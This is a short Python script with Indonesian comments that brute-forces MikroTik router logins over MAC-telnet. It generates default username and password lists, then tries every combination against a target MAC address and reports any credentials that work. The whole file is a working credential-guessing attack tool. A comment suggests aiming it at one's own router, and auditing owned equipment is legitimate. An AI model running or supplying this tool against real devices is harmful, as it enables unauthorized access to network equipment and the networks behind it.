# mac_winbox_bruteforce.py
import subprocess
import time
import os

# Otomatis generate user.txt dan pass.txt jika belum ada
def generate_sample_files():
    if not os.path.exists("user.txt"):
        with open("user.txt", "w") as f:
            f.write("admin\nuser\ntest\n")
    if not os.path.exists("pass.txt"):
        with open("pass.txt", "w") as f:
            f.write("admin\n123456\nmikrotik\n")

generate_sample_files()

# Konfigurasi dasar
target_mac = "4C:5E:0C:XX:XX:XX"  # Ganti dengan MAC Mikrotik kamu
interface = "eth0"  # Ganti sesuai interface kamu (misal enp0s3, wlan0)
user_list = "user.txt"
pass_list = "pass.txt"

print("[INFO] Mulai brute force terhadap MAC address Mikrotik...")

# Baca daftar user dan password
with open(user_list) as uf, open(pass_list) as pf:
    usernames = [u.strip() for u in uf]
    passwords = [p.strip() for p in pf]

# Loop kombinasi user dan password
for user in usernames:
    for pw in passwords:
        print(f"[TRY] {user}:{pw}")

        # Jalankan perintah mac-telnet login
        try:
            result = subprocess.run(
                ["mac-telnet", target_mac, "-u", user, "-p", pw, "-i", interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=10
            )

            if b"Login failed" not in result.stdout and result.returncode == 0:
                print(f"[SUCCESS] Login berhasil -> {user}:{pw}")
                exit()
            
        except subprocess.TimeoutExpired:
            print("[TIMEOUT] Tidak ada respon dari target.")
        
        time.sleep(1)

print("[DONE] Tidak ditemukan kombinasi yang berhasil.")
